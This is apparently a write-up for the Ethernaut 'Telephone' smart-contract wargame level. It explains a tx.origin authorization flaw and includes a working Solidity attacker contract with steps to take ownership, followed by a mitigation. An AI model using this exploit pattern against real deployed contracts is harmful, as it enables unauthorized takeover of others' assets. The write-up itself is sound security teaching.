# Ethernaut #4 — Telephone

## Vulnerability: Improper Authorization Using `tx.origin`

### The Catch

The contract checks whether `tx.origin` and `msg.sender` are different before allowing ownership to change.

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

The catch is that `tx.origin` always refers to the original EOA that initiated the transaction, while `msg.sender` refers to the immediate caller of the current contract.

When a transaction passes through another contract, these two addresses can be different.

### Exploit

I created a simple attacker contract that calls `changeOwner()` on the Telephone instance.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address) external;
}

contract TelephoneAttack {
    address immutable tp = 0xcf20744D98ad21622f0F3B193E38164267c5aF9F;

    function attack() external {
        ITelephone(tp).changeOwner(msg.sender);
    }
}
```

**Attack steps:**

1. Deploy `TelephoneAttack`.
2. Call `attack()` from your wallet.
3. The attacker contract calls `changeOwner()` on the Telephone instance, passing your wallet address as the new owner.
4. Inside Telephone, `tx.origin` is your wallet, while `msg.sender` is the attacker contract. The condition passes, and ownership transfers to your wallet.

### Root Cause

The contract relies on `tx.origin` for authorization instead of verifying that the immediate caller is authorized.

Since an attacker can insert another contract into the call chain, the check can be satisfied by an ordinary wallet interaction.

### Impact

An attacker can take ownership of the Telephone contract without being its current owner.

### Mitigation

Use `msg.sender` with proper access control instead of `tx.origin`.

```solidity
function changeOwner(address _owner) public {
    require(msg.sender == owner, "Not the owner");
    owner = _owner;
}
```

This ensures that only the current owner can transfer ownership.

### Key Takeaway

**Never use `tx.origin` as an authorization mechanism.** It identifies the transaction's original EOA, not the immediate caller, and can be exploited through an intermediate contract.